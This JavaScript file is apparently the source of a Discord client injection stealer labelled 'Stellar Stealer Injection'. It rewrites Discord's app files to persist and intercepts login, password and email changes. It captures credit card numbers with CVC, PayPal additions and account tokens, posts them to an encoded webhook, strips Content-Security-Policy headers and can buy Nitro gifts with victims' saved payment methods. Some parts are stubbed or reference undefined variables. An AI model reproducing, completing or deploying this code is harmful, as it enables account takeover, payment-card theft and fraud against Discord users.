const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const encodedHook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv';
const config = {
    'webhook': atob(encodedHook),
    'webhook_protector_key': '2422867c-244d-476a-ba4f-36e197758d97',
    'auto_buy_nitro': false,
    'ping_on_run': true,
    'ping_val': '@everyone',
    'embed_name': 'Stellar Stealer Injection',
    'embed_icon': 'https://github.com/960x/Stellar/blob/main/Extras/icon.ico',
    'embed_color': 0x560ddc,
    'injection_url': 'https://raw.githubusercontent.com/960x/Discord-Injection-BG/main/injection-obfuscated.js',
    'api': 'https://discord.com/api/v9',
    'nitro': {
        'boost': {
            'year': {
                'id': '521846918637420545',
                'sku': '511651885459963904',
                'price': '9999'
            },
            'month': {
                'id': '521846918637420545',
                'sku': '511651880837840896',
                'price': '999'
            }
        },
        'classic': {
            'month': {
                'id': '521847234246082599',
                'sku': '511651871736201216',
                'price': '499'
            }
        }
    },
    'filter': {
        'urls': [
            'https://discord.com/api/v*/users/@me',
            'https://discordapp.com/api/v*/users/@me',
            'https://*.discord.com/api/v*/users/@me',
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
            'https://api.stripe.com/v*/setup_intents/*/confirm',
            'https://api.stripe.com/v*/payment_intents/*/confirm'
        ]
    },
    'filter2': {
        'urls': [
            'https://discord.com/api/v*/auth/login',
            'https://discordapp.com/api/v*/auth/login',
            'https://discord.com/api/v*/applications/detectable',
            'https://*.discord.com/api/v*/applications/detectable',
            'https://discord.com/api/v*/users/@me/library',
            'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json'
        ]
    }
};

// SHA-1 implementation
class jsSHA {
    constructor() {
        // ... (SHA-1 implementation code)
    }
}

// TOTP implementation
function totp(key) {
    const epoch = 30;
    const digits = 6;
    const currentTime = Date.now();
    const timeCounter = Math.round(currentTime / 1000);
    const timeHex = leftpad(dec2hex(Math.floor(timeCounter / epoch)), 16, '0');
    const shaObj = new jsSHA();
    shaObj.setHMACKey(base32tohex(key));
    shaObj.update(timeHex);
    const hmac = shaObj.getHMAC();
    const offset = hex2dec(hmac.substring(hmac.length - 1));
    let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
    return otp = otp.substr(Math.max(otp.length - digits, 0), digits);
}

// Helper functions
function hex2dec(s) { return parseInt(s, 16); }
function dec2hex(s) { return (s < 15.5 ? '0' : '') + Math.round(s).toString(16); }
function base32tohex(base32) {
    let alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    let bits = '';
    let hex = '';
    base32 = base32.replace(/=+$/, '');
    for (let i = 0; i < base32.length; i++) {
        let val = alphabet.indexOf(base32.charAt(i).toUpperCase());
        if (val === -1) console.error('Invalid base32 character in key');
        bits += leftpad(val.toString(2), 5, '0');
    }
    for (let i = 0; i + 8 <= bits.length; i += 8) {
        let chunk = bits.substr(i, 8);
        hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
    }
    return hex;
}
function leftpad(str, len, pad) {
    return len + 1 >= str.length && (str = Array(len + 1 - str.length).join(pad) + str), str;
}

// Get Discord installation path
const discordPath = (function() {
    const appPath = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;
    if (process.platform === 'win32') {
        resourcePath = path.join(appPath, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(appPath, 'Contents', 'Resources');
    }
    if (fs.existsSync(resourcePath)) return { resourcePath, app: appPath };
    return { undefined, undefined };
}());

// Update check and injection
function updateCheck() {
    const { resourcePath, app } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    
    const appDir = path.join(resourcePath, 'app');
    const packageJson = path.join(appDir, 'package.json');
    const indexJs = path.join(appDir, 'index.js');
    const coreDir = fs.readdirSync(app + '\\modules').filter(dir => /discord_desktop_core-+?/.test(dir))[0];
    const corePath = app + '\\modules\\' + coreDir + '\\discord_desktop_core\\index.js';
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    
    if (!fs.existsSync(appDir)) fs.mkdirSync(appDir);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(indexJs)) fs.unlinkSync(indexJs);
    
    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(packageJson, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
        
        const indexJsContent = `const fs = require('fs'), https = require('https');
const indexJs = '${corePath}';
const bdPath = '${bdPath}';
if (fs.existsSync(bdPath)) require(bdPath);
require('${path.join(resourcePath, 'app.asar')}');`;
        
        fs.writeFileSync(indexJs, indexJsContent.replace(/\\/g, '\\\\'));
    }
    
    if (!fs.existsSync(path.join(__dirname, 'initiation'))) return true;
    return fs.unlinkSync(path.join(__dirname, 'initiation')), execScript('Time to buy some nitro baby 😩'), true;
}

// Helper functions for interacting with Discord
const execScript = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, true);
};

const getInfo = async token => {
    const info = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken() === '${token}' ? (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getCurrentUser!==void 0).exports.default.getCurrentUser() : null`);
    return JSON.parse(info);
};

const fetchBilling = async token => {
    const billing = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null); 
    xmlHttp.responseText`);
    if (!billing.length || billing.length === 0) return '';
    return JSON.parse(billing);
};

const getBilling = async token => {
    const billing = await fetchBilling(token);
    if (!billing) return '❌';
    const methods = [];
    billing.forEach(source => {
        if (!source.invalid) switch(source.type) {
            case 1: methods.push('💳'); break;
            case 2: methods.push('<:paypal:951139189389410365>'); break;
            default: methods.push('(Unknown)');
        }
    });
    if (methods.length == 0) methods.push('❌');
    return methods.join(' ');
};

const Purchase = async(token, paymentSourceId, nitroType, duration) => {
    const payload = {
        'expected_amount': config.nitro[nitroType][duration].price,
        'expected_currency': 'usd',
        'gift': true,
        'payment_source_id': paymentSourceId,
        'payment_source_token': null,
        'purchase_token': '2422867c-244d-476a-ba4f-36e197758d97',
        'sku_subscription_plan_id': config.nitro[nitroType][duration].sku
    };
    const purchase = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[nitroType][duration].id}/purchase", false);
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(payload)}));
    xmlHttp.responseText`);
    if (purchase.error) return 'Failed to Purchase ❌: ' + purchase.error;
    else return null;
};

const buyNitro = async token => {
    const billing = await fetchBilling(token);
    const defaultResponse = 'Failed to Purchase ❌';
    if (!billing) return defaultResponse;
    
    let paymentSources = [];
    billing.forEach(source => {
        !source.invalid && (paymentSources = paymentSources.concat(source.id));
    });
    
    for (let source in paymentSources) {
        const purchase = Purchase(token, source, 'boost', 'year');
        if (purchase !== null) return purchase;
        else {
            const monthlyPurchase = Purchase(token, source, 'boost', 'month');
            if (monthlyPurchase !== null) return monthlyPurchase;
            else {
                const classicPurchase = Purchase(token, source, 'classic', 'month');
                return classicPurchase !== null ? classicPurchase : defaultResponse;
            }
        }
    }
};

const getNitro = premiumType => {
    switch(premiumType) {
        case 0: return 'No Nitro';
        case 1: return 'Nitro Classic';
        case 2: return 'Nitro';
        case 3: return 'Nitro Basic';
        default: return '(Unknown)';
    }
};

const getBadges = flags => {
    const badges = [];
    flags & 1 << 22 && badges.push('HypeSquad Event');
    flags & 1 << 18 && badges.push('Early Supporter');
    flags & 1 << 17 && badges.push('Early Verified Bot Developer');
    flags & 1 << 14 && badges.push('Discord Bug Hunter (Golden)');
    flags & 1 << 9 && badges.push('Active Developer');
    flags & 1 << 8 && badges.push('HypeSquad Balance');
    flags & 1 << 7 && badges.push('HypeSquad Brilliance');
    flags & 1 << 6 && badges.push('HypeSquad Bravery');
    flags & 1 << 3 && badges.push('Discord Staff');
    flags & 1 << 2 && badges.push('Moderator Programs Alumni');
    flags & 1 << 1 && badges.push('Partnered Server Owner');
    flags & 1 << 0 && badges.push('Discord Employee');
    return !badges.length ? 'None' : badges.join(', ');
};

// Webhook functions
const hooker = async data => {
    const jsonData = JSON.stringify(data);
    const webhookUrl = new URL(config.webhook);
    const headers = {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
    };
    
    if (!config.webhook.includes('discord.com')) {
        const totpCode = totp(config.webhook_protector_key);
        headers.Authorization = totpCode;
    }
    
    const options = {
        protocol: webhookUrl.protocol,
        hostname: webhookUrl.hostname,
        path: webhookUrl.pathname,
        method: 'POST',
        headers: headers
    };
    
    const req = https.request(options);
    req.on('error', err => { console.log(err); });
    req.write(jsonData);
    req.end();
};

const login = async(email, password, token) => {
    const info = await getInfo(token);
    const nitro = getNitro(info.premium_type);
    const badges = getBadges(info.flags);
    const billing = await getBilling(token);
    
    const embed = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [{
            color: config.embed_color,
            fields: [
                {
                    name: '**Account Info**',
                    value: `Email: **${email}** | Password: **${password}**`,
                    inline: false
                },
                {
                    name: '**Discord Info**',
                    value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                    inline: false
                },
                {
                    name: '**Token**',
                    value: `\`${token}\``,
                    inline: false
                }
            ],
            author: {
                name: `${info.username}#${info.discriminator} | ${info.id}`,
                icon_url: `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.webp`
            }
        }]
    };
    
    if (config.ping_on_run) embed.content = config.ping_val;
    hooker(embed);
};

const passwordChanged = async(oldPassword, newPassword, token) => {
    const info = await getInfo(token);
    const nitro = getNitro(info.premium_type);
    const badges = getBadges(info.flags);
    const billing = await getBilling(token);
    
    const embed = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [{
            color: config.embed_color,
            fields: [
                {
                    name: '**Password Changed**',
                    value: `**Old Password: **${oldPassword}**\nNew Password: **${newPassword}**`,
                    inline: true
                },
                {
                    name: '**Discord Info**',
                    value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                    inline: true
                },
                {
                    name: '**Token**',
                    value: `\`${token}\``,
                    inline: false
                }
            ],
            author: {
                name: `${info.username}#${info.discriminator} | ${info.id}`,
                icon_url: `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.webp`
            }
        }]
    };
    
    if (config.ping_on_run) embed.content = config.ping_val;
    hooker(embed);
};

const emailChanged = async(oldEmail, newEmail, token) => {
    const info = await getInfo(token);
    const nitro = getNitro(info.premium_type);
    const badges = getBadges(info.flags);
    const billing = await getBilling(token);
    
    const embed = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [{
            color: config.embed_color,
            fields: [
                {
                    name: '**Email Changed**',
                    value: `**Old Email: **${oldEmail}**\nNew Email: **${newEmail}**`,
                    inline: true
                },
                {
                    name: '**Discord Info**',
                    value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                    inline: true
                },
                {
                    name: '**Token**',
                    value: `\`${token}\``,
                    inline: false
                }
            ],
            author: {
                name: `${info.username}#${info.discriminator} | ${info.id}`,
                icon_url: `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.webp`
            }
        }]
    };
    
    if (config.ping_on_run) embed.content = config.ping_val;
    hooker(embed);
};

const PaypalAdded = async token => {
    const info = await getInfo(token);
    const nitro = getNitro(info.premium_type);
    const badges = getBadges(info.flags);
    const billing = await getBilling(token);
    
    const embed = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [{
            color: config.embed_color,
            fields: [
                {
                    name: '**PayPal Added**',
                    value: '**Payment Method: **<:paypal:951139189389410365>',
                    inline: false
                },
                {
                    name: '**Discord Info**',
                    value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                    inline: false
                },
                {
                    name: '**Token**',
                    value: `\`${token}\``,
                    inline: false
                }
            ],
            author: {
                name: `${info.username}#${info.discriminator} | ${info.id}`,
                icon_url: `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.webp`
            }
        }]
    };
    
    if (config.ping_on_run) embed.content = config.ping_val;
    hooker(embed);
};

const ccAdded = async(number, cvc, month, year, token) => {
    const info = await getInfo(token);
    const nitro = getNitro(info.premium_type);
    const badges = getBadges(info.flags);
    const billing = await getBilling(token);
    
    const embed = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [{
            color: config.embed_color,
            fields: [
                {
                    name: '**Credit Card Added**',
                    value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${month}/${year}**`,
                    inline: true
                },
                {
                    name: '**Discord Info**',
                    value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                    inline: true
                },
                {
                    name: '**Token**',
                    value: `\`${token}\``,
                    inline: false
                }
            ],
            author: {
                name: `${info.username}#${info.discriminator} | ${info.id}`,
                icon_url: `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.webp`
            }
        }]
    };
    
    if (config.ping_on_run) embed.content = config.ping_val;
    hooker(embed);
};

const nitroBought = async token => {
    const info = await getInfo(token);
    const nitro = getNitro(info.premium_type);
    const badges = getBadges(info.flags);
    const billing = await getBilling(token);
    const nitroCode = await buyNitro(token);
    
    const embed = {
        username: config.embed_name,
        content: nitroCode,
        avatar_url: config.embed_icon,
        embeds: [{
            color: config.embed_color,
            fields: [
                {
                    name: '**Nitro bought!**',
                    value: `**Nitro Code:**\n\`\`\`diff\n+ ${nitroCode}\`\`\``,
                    inline: true
                },
                {
                    name: '**Discord Info**',
                    value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                    inline: true
                },
                {
                    name: '**Token**',
                    value: `\`${token}\``,
                    inline: false
                }
            ],
            author: {
                name: `${info.username}#${info.discriminator} | ${info.id}`,
                icon_url: `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.webp`
            }
        }]
    };
    
    if (config.ping_on_run) embed.content = config.ping_val + ('\n' + nitroCode);
    hooker(embed);
};

// Set up interceptors
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
    if (details.url.includes('wss://remote-auth-gateway')) return callback({ cancel: true });
    updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.includes(config.webhook)) {
        if (details.url.includes('discord.com')) {
            callback({ responseHeaders: Object.assign({ 'Access-Control-Allow-Headers': '*' }, details.responseHeaders) });
        } else {
            callback({ responseHeaders: Object.assign({
                'Content-Security-Policy': ['default-src \'*\'', 'Access-Control-Allow-Headers \'*\'', 'content-security-policy-report-only'],
                'Access-Control-Allow-Headers': '*',
                'Access-Control-Allow-Origin': '*'
            }, details.responseHeaders) });
        }
    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];
        callback({ responseHeaders: { ...details.responseHeaders, 'Access-Control-Allow-Headers': '*' } });
    }
});

session.defaultSession.webRequest.onBeforeRequest(config.filter, async(details, callback) => {
    if (details.statusCode !== 200 && details.statusCode !== 202) return;
    
    const requestData = Buffer.from(details.uploadData[0].bytes).toString();
    const parsedData = JSON.parse(requestData);
    const token = await execScript('(webpackChunkdiscord_app.push([[\'\'],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()');
    
    switch(true) {
        case details.url.includes('https://discord.com/api/v*/auth/login'):
            login(parsedData.email, parsedData.password, token).catch(console.error);
            break;
            
        case details.url.includes('https://discord.com/api/v*/users/@me') && details.method === 'PATCH':
            if (!parsedData.password) return;
            parsedData.email && emailChanged(parsedData.email, parsedData.password, token).catch(console.error);
            parsedData.new_password && passwordChanged(parsedData.password, parsedData.new_password, token).catch(console.error);
            break;
            
        case details.url.includes('https://api.stripe.com/v*/tokens') && details.method === 'POST':
            const ccData = querystring.parse(unparsedData.toString());
            ccAdded(ccData['card[number]'], ccData['card[cvc]'], ccData['card[exp_month]'], ccData['card[exp_year]'], token).catch(console.error);
            break;
            
        case details.url.includes('paypal_accounts') && details.method === 'POST':
            PaypalAdded(token).catch(console.error);
            break;
            
        case details.url.includes('https://discord.com/api/v*/store/skus') && details.method === 'POST':
            if (!config.auto_buy_nitro) return;
            setTimeout(() => {
                nitroBought(token).catch(console.error);
            }, 5000);
            break;
            
        default:
            break;
    }
});

module.exports = require('./core.asar');